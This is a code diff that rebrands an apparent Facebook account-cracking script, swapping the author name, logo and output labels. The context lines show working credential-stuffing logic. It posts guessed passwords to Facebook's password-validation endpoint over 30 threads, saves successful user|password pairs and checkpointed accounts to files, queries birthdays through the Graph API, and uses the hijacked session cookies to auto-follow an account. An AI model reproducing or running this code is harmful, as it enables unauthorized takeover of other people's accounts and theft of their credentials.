@@ -102,14 +102,14 @@ def jalan(z):
 def logo():
 	print("""
  
-\033[1;96m\t .d8888b.   .d88888b.  888      .d88888b.  
-\033[1;90m\td88P  Y88b d88P" "Y88b 888     d88P" "Y88b 
-\033[1;92m\tY88b.      888     888 888     888     888 
-\033[1;93m\t "Y888b.   888     888 888     888     888 
-\033[1;95m\t    "Y88b. 888     888 888     888     888 
-\033[1;94m\t      "888 888     888 888     888     888 
-\033[1;96m\tY88b  d88P Y88b. .d88P 888     Y88b. .d88P 
-\033[1;92m\t "Y8888P"   "Y88888P"  88888888 "Y88888P"  
+ \033[1;96m\t $$$$$$\ $$\      $$\ $$$$$$$\   $$$$$$\  $$\   $$\ 
+\033[1;90m\t\_$$  _|$$$\    $$$ |$$  __$$\ $$  __$$\ $$$\  $$ |
+\033[1;92m\t$$ |  $$$$\  $$$$ |$$ |  $$ |$$ /  $$ |$$$$\ $$ |
+\033[1;93m\t $$ |  $$\$$\$$ $$ |$$$$$$$  |$$$$$$$$ |$$ $$\$$ |
+\033[1;95m\t    $$ |  $$ \$$$  $$ |$$  __$$< $$  __$$ |$$ \$$$$ |
+\033[1;94m\t      $$ |  $$ |\$  /$$ |$$ |  $$ |$$ |  $$ |$$ |\$$$ |
+\033[1;96m\t$$$$$$\ $$ | \_/ $$ |$$ |  $$ |$$ |  $$ |$$ | \$$ |
+\033[1;92m\t \______|\__|     \__|\__|  \__|\__|  \__|\__|  \__|
        """)
 
 def reg():
@@ -156,7 +156,7 @@ def reg2():
 
 
 #MASUK TOKEN
-def MRSOLO(OK,cp):
+def MRIMRAN(OK,cp):
     if len(OK) != 0 or len(cp) != 0:
         print('\n----------------------------------------------')
         print(' Crack Has Been Completed.')
@@ -173,7 +173,7 @@ def python_java():
     ipm = requests.get(url_ip).json() 
     IP = ipm["origin"]
     print(" \033[1;95m ---------------------------------------------");time.sleep(0.03)
-    print(" \033[1;96m Author     :      \033[1;92mNaseer Khan")
+    print(" \033[1;96m Author     :      \033[1;92mImran Ali")
     print(" \033[1;96m Team       :      \033[1;92mSOLO")
     print(" \033[1;96m Version    :       \033[1;92m0.01")
     print(" \033[1;95m ---------------------------------------------");time.sleep(0.03)
@@ -222,7 +222,7 @@ class __xyz__:
             print(' WRONG INPUT ');self.janu(id)
     def __metode__(self, user, __chi__, chachaji):
         global ok,cp,loop
-        sys.stdout.write(f'\r [NK] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
+        sys.stdout.write(f'\r [IM] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
         sys.stdout.flush()
         try:
             for pw in __chi__:
@@ -272,10 +272,10 @@ class __xyz__:
                 po = session.post(f"https://{chachaji}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f'\r{H} [SOLO-OK] {user} | {pw}')
+                    print(f'\r{H} [IMRAN-OK] {user} | {pw}')
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
-                    open('/sdcard/SOLO-OK.txt' , 'a').write('%s\n' % wrt)
+                    open('/sdcard/IMRAN-OK.txt' , 'a').write('%s\n' % wrt)
                     self.follow(session,coki)
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
@@ -284,20 +284,20 @@ class __xyz__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s \033[1;91m[SOLO-CP] %s | %s ' % (K,user,pw))
+                        print('\r%s \033[1;91m[IMRAN-CP] %s | %s ' % (K,user,pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
-                        open('/sdcard/SOLO-CP.txt' , 'a').write('%s\n' % wrt)
+                        open('/sdcard/IMRAN-CP.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
                         day   = ''
                         year  = ''
                     except:pass
-                    print('\r%s \033[1;91m[SOLO-CP] %s | %s ' % (K,user,pw))
+                    print('\r%s \033[1;91m[IMRAN-CP] %s | %s ' % (K,user,pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
-                    open('/sdcard/SOLO-CP.txt' , 'a').write('%s\n' % wrt)
+                    open('/sdcard/IMRAN-CP.txt' , 'a').write('%s\n' % wrt)
                     break
                 else:
                     continue
@@ -318,7 +318,7 @@ class __xyz__:
             print(' \033[1;92m IN THE BACKGROUND ')
             print('-------------------------------------------')
             print('')
-            with KINGNASEER(max_workers=30) as kirim:
+            with KINFIMRAN(max_workers=30) as kirim:
                 for thankme in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = thankme.split('|')
@@ -331,7 +331,7 @@ class __xyz__:
                     except:
                         pass
 
-            MRSOLO(OK,cp)
+            MRIMRAN(OK,cp)
         elif chi in ('2', '02'):
 
             os.system('clear')
@@ -343,7 +343,7 @@ class __xyz__:
             print(' \033[1;97m CRACK HAS BEEN STARTED')
             print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
             print('')
-            with KINGNASEER(max_workers=30) as kirim:
+            with KINFIMRAN(max_workers=30) as kirim:
                 for thankme in self.id: # CHECK_THE_POWER_OF_YOUR_DAD
                     try:
                         uid, name = thankme.split('|')
@@ -356,7 +356,7 @@ class __xyz__:
                     except:
                         pass
 
-            MRSOLO(OK,cp)
+            MRIMRAN(OK,cp)
         else:
             print('\n Select Valid One');self.__pler__()
 
